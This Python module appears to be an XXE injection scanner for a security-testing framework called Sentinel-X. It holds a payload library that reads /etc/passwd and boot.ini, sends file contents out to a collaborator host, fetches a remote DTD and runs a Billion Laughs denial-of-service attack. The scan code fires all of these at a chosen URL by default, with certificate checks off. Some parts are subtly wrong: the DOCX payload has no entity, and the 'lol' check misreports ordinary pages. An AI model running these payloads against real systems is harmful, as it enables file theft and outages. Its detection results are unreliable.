"""XXE Tool Integration for Sentinel-X

Provides structured execution for XML External Entity (XXE) injection testing.

Features:
- Classic XXE (file read)
- Blind XXE (out-of-band exfiltration)
- XXE via SVG upload
- XXE via SOAP/XML-RPC
- Error-based XXE
- XXE via DOCX/XLSX upload
- Parameter entity XXE
- XXE payload generation
"""

from dataclasses import asdict, dataclass
from datetime import datetime
from typing import Any


@dataclass
class XXEResult:
    """Structured XXE scan result"""
    target: str
    test_type: str
    vulnerability_detected: bool
    findings: list[dict[str, Any]]
    file_read_results: dict[str, str]
    execution_time_seconds: float
    tool_version: str
    raw_responses: list[dict[str, Any]]
    errors: list[str]

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


# XXE Payload Library — organized by technique
XXE_PAYLOADS = {
    "classic_out_of_band": [
        # Classic: Read /etc/passwd via OOB
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE root ['
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']><root>&xxe;</root>'
        ),
        # Windows: Read boot.ini
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///c:/boot.ini">'
            ']><foo>&xxe;</foo>'
        ),
    ],
    "blind_oob": [
        # Blind XXE with HTTP out-of-band
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
            '<!ENTITY callhome SYSTEM "http://COLLABORATOR/?file=%xxe;">'
            ']><foo>&callhome;</foo>'
        ),
        # Blind XXE with FTP out-of-band
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % xxe SYSTEM "file:///etc/hostname">'
            '<!ENTITY % callhome SYSTEM "ftp://COLLABORATOR/%xxe;">'
            '%callhome;'
            ']><foo>test</foo>'
        ),
    ],
    "error_based": [
        # Error-based XXE (file content in error message)
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">'
            '%eval;'
            '%error;'
            ']><foo>test</foo>'
        ),
    ],
    "svg_upload": [
        # SVG XXE payload
        (
            '<?xml version="1.0" standalone="yes"?>'
            '<!DOCTYPE svg ['
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
            '<text font-size="16" x="0" y="16">&xxe;</text>'
            '</svg>'
        ),
    ],
    "parameter_entity": [
        # Parameter entity XXE
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
            '%xxe;'
            ']><foo>test</foo>'
        ),
    ],
    "xinclude": [
        # XInclude XXE
        (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include href="file:///etc/passwd" parse="text"/>'
            '</foo>'
        ),
    ],
    "docx_xlsx": [
        # XXE via docx/xlsx style injection
        (
            '<?xml version="1.0"?>'
            '<?mso-application progid="Word.Document"?>'
            '<pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage">'
            '<pkg:part pkg:name="/_rels/.rels" pkg:contentType="application/vnd.openxmlformats-package.relationships+xml">'
            '<pkg:xmlData>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
            '</Relationships>'
            '</pkg:xmlData>'
            '</pkg:part>'
            '</pkg:package>'
        ),
    ],
    "soap_xxe": [
        # SOAP XXE payload
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soap:Body>'
            '<foo>&xxe;</foo>'
            '</soap:Body>'
            '</soap:Envelope>'
        ),
    ],
    "dtd_retrieval": [
        # DTD retrieval for blind XXE
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % dtd SYSTEM "http://COLLABORATOR/evil.dtd">'
            '%dtd;'
            ']><foo>test</foo>'
        ),
    ],
    "billion_laughs": [
        # Billion Laughs DoS (for detection only - note: can be destructive)
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '<!ENTITY lol "lol">'
            '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
            ']><root>&lol4;</root>'
        ),
    ],
}


class XXETool:
    """XXE Injection testing tool integration for Sentinel-X"""

    def __init__(self):
        self.name = "xxe_tool"
        self.test_types = list(XXE_PAYLOADS.keys())
        self.version_cache: str | None = "1.0.0"  # Internal version

    def is_available(self) -> bool:
        """XXE tool is always available (payload-based, no external binary needed)"""
        return True

    def get_version(self) -> str:
        return self.version_cache or "1.0.0"

    async def scan(
        self,
        target: str,
        test_type: str = "all",
        headers: dict[str, str] | None = None,
        method: str = "POST",
        content_type: str = "application/xml",
        timeout_sec: int = 30,
        collaborator_url: str | None = None,
    ) -> XXEResult:
        """
        Test a target endpoint for XXE vulnerabilities.

        Args:
            target: Target URL to test
            test_type: Type of XXE test ("all", "classic_out_of_band", "blind_oob", etc.)
            headers: Custom HTTP headers
            method: HTTP method (POST, PUT, PATCH)
            content_type: Content-Type header value
            timeout_sec: Request timeout
            collaborator_url: Collaborator URL for OOB testing (e.g., Burp Collaborator)
        """
        errors = []
        findings = []
        raw_responses = []
        file_read_results: dict[str, str] = {}
        start_time = datetime.now()
        vuln_detected = False

        if not headers:
            headers = {}

        if 'Content-Type' not in headers:
            headers['Content-Type'] = content_type

        # Determine which payload sets to test
        payload_sets = []
        if test_type == "all":
            payload_sets = [(k, v) for k, v in XXE_PAYLOADS.items()]
        elif test_type in self.test_types:
            payload_sets = [(test_type, XXE_PAYLOADS[test_type])]
        else:
            errors.append(f"Unknown test type: {test_type}. Available: {', '.join(self.test_types)}")
            payload_sets = [("classic_out_of_band", XXE_PAYLOADS["classic_out_of_band"])]

        try:
            import httpx
            async with httpx.AsyncClient(timeout=timeout_sec, verify=False) as client:
                for payload_name, payloads in payload_sets:
                    for idx, payload in enumerate(payloads):
                        # Replace collaborator placeholder if provided
                        test_payload = payload
                        if collaborator_url:
                            test_payload = test_payload.replace("COLLABORATOR", collaborator_url)

                        try:
                            if method.upper() == "POST":
                                resp = await client.post(target, content=test_payload, headers=headers)
                            elif method.upper() == "PUT":
                                resp = await client.put(target, content=test_payload, headers=headers)
                            elif method.upper() == "PATCH":
                                resp = await client.patch(target, content=test_payload, headers=headers)
                            else:
                                resp = await client.post(target, content=test_payload, headers=headers)

                            response_data = {
                                "payload_name": f"{payload_name}_{idx}",
                                "status_code": resp.status_code,
                                "headers": dict(resp.headers),
                                "body_length": len(resp.text),
                                "body_preview": resp.text[:500],
                            }
                            raw_responses.append(response_data)

                            # Detect XXE indicators
                            body_lower = resp.text.lower()

                            # File read success indicators
                            file_indicators = ["root:", "bin:", "daemon:", "nobody:", "boot loader", "[boot loader]", "windows"]
                            for indicator in file_indicators:
                                if indicator in body_lower:
                                    vuln_detected = True
                                    findings.append({
                                        "type": "xxe_file_read",
                                        "payload_type": payload_name,
                                        "indicator": indicator,
                                        "evidence": resp.text[:300],
                                        "confidence": "high",
                                    })
                                    file_read_results[f"{payload_name}_{idx}"] = resp.text[:1000]
                                    break

                            # Error-based XXE indicators
                            if "warning: simplexml" in body_lower or "simplexml_load_string" in body_lower:
                                vuln_detected = True
                                findings.append({
                                    "type": "xxe_error",
                                    "payload_type": payload_name,
                                    "indicator": "xml_parser_error",
                                    "evidence": resp.text[:300],
                                    "confidence": "medium",
                                })

                            # Reflection indicators
                            for test_str in ["root:", "lol", "boot.ini"]:
                                if test_str in resp.text:
                                    vuln_detected = True
                                    findings.append({
                                        "type": "xxe_reflection",
                                        "payload_type": payload_name,
                                        "indicator": f"reflected_{test_str}",
                                        "evidence": resp.text[:300],
                                        "confidence": "high",
                                    })
                                    break

                            # Server-side request indicators (for OOB)
                            if resp.status_code in (500, 502, 503):
                                findings.append({
                                    "type": "xxe_server_error",
                                    "payload_type": payload_name,
                                    "status": resp.status_code,
                                    "evidence": resp.text[:200],
                                    "confidence": "low",
                                })

                        except httpx.TimeoutException:
                            raw_responses.append({
                                "payload_name": f"{payload_name}_{idx}",
                                "error": "timeout",
                                "note": "Possible time-based XXE or blind SSRF"
                            })
                            findings.append({
                                "type": "xxe_timeout",
                                "payload_type": payload_name,
                                "confidence": "medium",
                            })
                        except Exception as e:
                            raw_responses.append({
                                "payload_name": f"{payload_name}_{idx}",
                                "error": str(e)[:200]
                            })

        except Exception as e:
            errors.append(str(e)[:200])

        execution_time = (datetime.now() - start_time).total_seconds()

        return XXEResult(
            target=target,
            test_type=test_type,
            vulnerability_detected=vuln_detected,
            findings=findings,
            file_read_results=file_read_results,
            execution_time_seconds=execution_time,
            tool_version=self.get_version(),
            raw_responses=raw_responses[:50],
            errors=errors
        )

    def get_payloads(self, test_type: str = "all") -> dict[str, list[str]]:
        """Get XXE payloads for manual use or integration"""
        if test_type == "all":
            return XXE_PAYLOADS
        if test_type in XXE_PAYLOADS:
            return {test_type: XXE_PAYLOADS[test_type]}
        return {}

    def get_capabilities(self) -> dict[str, Any]:
        """Return tool capabilities for tool discovery"""
        return {
            'name': self.name,
            'version': self.get_version(),
            'available': self.is_available(),
            'test_types': self.test_types,
            'features': [
                'xxe_detection',
                'file_read_exploitation',
                'blind_oob_testing',
                'error_based_xxe',
                'svg_xxe',
                'soap_xxe',
                'billion_laughs_detection',
                'payload_generation',
            ],
            'parameters': {
                'target': {'required': True, 'description': 'Target URL'},
                'test_type': {'required': False, 'default': 'all', 'options': self.test_types, 'description': 'XXE test category'},
                'method': {'required': False, 'default': 'POST', 'description': 'HTTP method'},
                'content_type': {'required': False, 'default': 'application/xml', 'description': 'Content-Type header'},
                'collaborator_url': {'required': False, 'description': 'OOB collaborator URL'},
            },
            'owasp_mapping': {
                'A05': 'Security Misconfiguration - XXE in XML parsers',
                'A08': 'Software and Data Integrity Failures - XXE via file uploads',
            }
        }


# Global instance for tool registry
_xxe_tool: XXETool | None = None


def get_xxe_tool() -> XXETool:
    """Get or create global XXE tool instance"""
    global _xxe_tool
    if _xxe_tool is None:
        _xxe_tool = XXETool()
    return _xxe_tool
